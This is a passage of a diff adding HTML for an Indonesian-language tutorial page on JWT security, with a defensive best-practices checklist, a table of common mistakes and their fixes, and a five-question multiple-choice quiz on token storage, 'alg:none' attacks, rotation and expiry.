+        <div class="info-box-title">💡 JWT Security Best Practices Checklist</div>
+        <ul>
+          <li>✅ Gunakan algoritma asymmetric (RS256/ES256) untuk production</li>
+          <li>✅ Whitelist algoritma yang diizinkan — jangan percaya field <code>alg</code> di token</li>
+          <li>✅ Set expiry yang singkat untuk access token (5-15 menit)</li>
+          <li>✅ Implementasikan refresh token rotation</li>
+          <li>✅ Simpan access token di memory, refresh token di httpOnly cookie</li>
+          <li>✅ Selalu validasi <code>iss</code>, <code>aud</code>, <code>exp</code>, dan <code>nbf</code> claims</li>
+          <li>✅ Gunakan <code>jti</code> (JWT ID) untuk mencegah replay attack</li>
+          <li>✅ Implementasikan token blocklist untuk logout/revocation</li>
+          <li>✅ Deteksi refresh token reuse dan revoke seluruh token family</li>
+          <li>✅ Gunakan HTTPS di semua endpoint</li>
+          <li>✅ Set <code>SameSite=Strict</code> pada cookies</li>
+          <li>✅ Implementasikan rate limiting pada auth endpoints</li>
+          <li>✅ Log semua aktivitas autentikasi untuk audit trail</li>
+          <li>✅ Lakukan security testing secara berkala</li>
+        </ul>
+      </div>
+
+      <h3>Kesalahan Umum</h3>
+      <table class="net-table">
+        <thead>
+          <tr>
+            <th>Kesalahan</th>
+            <th>Risiko</th>
+            <th>Solusi</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td>Menyimpan JWT di localStorage</td><td>Dicuri via XSS</td><td>Gunakan httpOnly cookie atau in-memory</td></tr>
+          <tr><td>Tidak menentukan algorithms whitelist</td><td>Algorithm confusion attack</td><td>Selalu tentukan <code>algorithms: ['RS256']</code></td></tr>
+          <tr><td>Expiry terlalu lama (hari/minggu)</td><td>Window serangan besar jika token dicuri</td><td>Access token 5-15 menit</td></tr>
+          <tr><td>Menyimpan data sensitif di payload</td><td>Data bocor karena payload hanya Base64 encoded</td><td>Hanya simpan non-sensitive claims</td></tr>
+          <tr><td>Tidak melakukan token rotation</td><td>Refresh token valid selamanya jika dicuri</td><td>Rotasi refresh token setiap penggunaan</td></tr>
+          <tr><td>Menggunakan secret key lemah</td><td>Bisa di-brute force</td><td>Minimum 256-bit random secret</td></tr>
+          <tr><td>Tidak memvalidasi audience/issuer</td><td>Token dari issuer lain bisa diterima</td><td>Selalu validasi <code>iss</code> dan <code>aud</code></td></tr>
+        </tbody>
+      </table>
+
+      <!-- AD SLOT -->
+      <div class="ad-slot ad-slot-wide">
+      <ins class="adsbygoogle"
+           style="display:block"
+           data-ad-client="ca-pub-2122797411859663"
+           data-ad-format="auto"
+           data-full-width-responsive="true"></ins>
+      <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+    
+
+      <!-- ============================== -->
+      <!-- SECTION 8: Quiz                -->
+      <!-- ============================== -->
+      <h2 id="quiz">8. Quiz: Uji Pemahamanmu!</h2>
+      <p>Setelah membaca tutorial di atas, jawablah 5 pertanyaan berikut untuk menguji pemahamanmu tentang JWT Security:</p>
+
+      <div class="quiz-container" id="quizJwt01">
+
+        <!-- Pertanyaan 1 -->
+        <div class="quiz-question">
+          <h3>Pertanyaan 1: Bagian mana dari JWT yang TIDAK dienkripsi dan bisa dibaca siapa saja?</h3>
+          <div class="quiz-options">
+            <div class="quiz-option" data-question="0" data-answer="a">a) Header</div>
+            <div class="quiz-option" data-question="0" data-answer="b">b) Payload</div>
+            <div class="quiz-option" data-question="0" data-answer="c">c) Signature</div>
+            <div class="quiz-option" data-question="0" data-answer="d">d) Semua bagian (Header, Payload, dan Signature)</div>
+          </div>
+        </div>
+
+        <!-- Pertanyaan 2 -->
+        <div class="quiz-question">
+          <h3>Pertanyaan 2: Metode penyimpanan JWT mana yang paling aman terhadap XSS?</h3>
+          <div class="quiz-options">
+            <div class="quiz-option" data-question="1" data-answer="a">a) localStorage</div>
+            <div class="quiz-option" data-question="1" data-answer="b">b) sessionStorage</div>
+            <div class="quiz-option" data-question="1" data-answer="c">c) httpOnly Cookie</div>
+            <div class="quiz-option" data-question="1" data-answer="d">d) Semua sama amannya</div>
+          </div>
+        </div>
+
+        <!-- Pertanyaan 3 -->
+        <div class="quiz-question">
+          <h3>Pertanyaan 3: Apa yang terjadi dalam serangan "alg:none"?</h3>
+          <div class="quiz-options">
+            <div class="quiz-option" data-question="2" data-answer="a">a) Attacker menghapus payload dari token</div>
+            <div class="quiz-option" data-question="2" data-answer="b">b) Attacker mengubah algoritma ke "none" sehingga signature tidak diverifikasi</div>
+            <div class="quiz-option" data-question="2" data-answer="c">c) Attacker brute force secret key</div>
+            <div class="quiz-option" data-question="2" data-answer="d">d) Attacker menambahkan algoritma baru ke header</div>
+          </div>
+        </div>
+
+        <!-- Pertanyaan 4 -->
+        <div class="quiz-question">
+          <h3>Pertanyaan 4: Mengapa refresh token harus dirotasi setiap kali digunakan?</h3>
+          <div class="quiz-options">
+            <div class="quiz-option" data-question="3" data-answer="a">a) Untuk mempercepat autentikasi</div>
+            <div class="quiz-option" data-question="3" data-answer="b">b) Untuk mengurangi ukuran database</div>
+            <div class="quiz-option" data-question="3" data-answer="c">c) Untuk mendeteksi dan mencegah penggunaan token yang dicuri</div>
+            <div class="quiz-option" data-question="3" data-answer="d">d) Untuk memenuhi standar HTTP</div>
+          </div>
+        </div>
+
+        <!-- Pertanyaan 5 -->
+        <div class="quiz-question">
+          <h3>Pertanyaan 5: Berapa lama expiry yang direkomendasikan untuk access token?</h3>
+          <div class="quiz-options">
+            <div class="quiz-option" data-question="4" data-answer="a">a) 1 detik</div>
+            <div class="quiz-option" data-question="4" data-answer="b">b) 5-15 menit</div>
+            <div class="quiz-option" data-question="4" data-answer="c">c) 30 hari</div>
+            <div class="quiz-option" data-question="4" data-answer="d">d) Tidak pernah expired</div>
+          </div>
+        </div>
+
+        <button class="quiz-btn" aria-label="Periksa jawaban kuis">📝 Periksa Jawaban</button>
+        <div class="quiz-result"></div>
+      </div>
+
+      <!-- AD SLOT -->
+      <div class="ad-slot ad-slot-wide">
+      <ins class="adsbygoogle"
+           style="display:block"
+           data-ad-client="ca-pub-2122797411859663"
+           data-ad-format="auto"
+           data-full-width-responsive="true"></ins>
+      <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+    
+
+      <!-- ARTICLE NAVIGATION -->
+      <div class="article-nav">
+        <a href="web-content-security-policy.html" class="prev">
+          <span class="nav-label">← Sebelumnya</span>
+          <span class="nav-title">Content Security Policy (CSP)</span>
+        </a>
+        <a href="network-zero-trust.html" class="next">
+          <span class="nav-label">Selanjutnya →</span>
+          <span class="nav-title">Zero Trust Security Model</span>
+        </a>
+      </div>
+
+    </div>
+  </article>
+
+  <!-- ========== NEWSLETTER ========== -->
+  <section class="newsletter-section" id="newsletter">
+    <div class="container">
+      <div class="newsletter-card fade-in">
+        <h2>📬 Dapatkan Tutorial Terbaru</h2>
+        <p>Subscribe untuk mendapatkan tutorial terbaru langsung di inbox kamu. Gratis, tanpa spam.</p>
+        <form class="newsletter-form" onsubmit="handleSubscribe(event)">
+          <input type="email" placeholder="email@kamu.com" required>
+          <button type="submit" class="btn-primary">Subscribe</button>
+        </form>
+      </div>
+    </div>
+  </section>
+
+  <!-- ========== FOOTER ========== -->
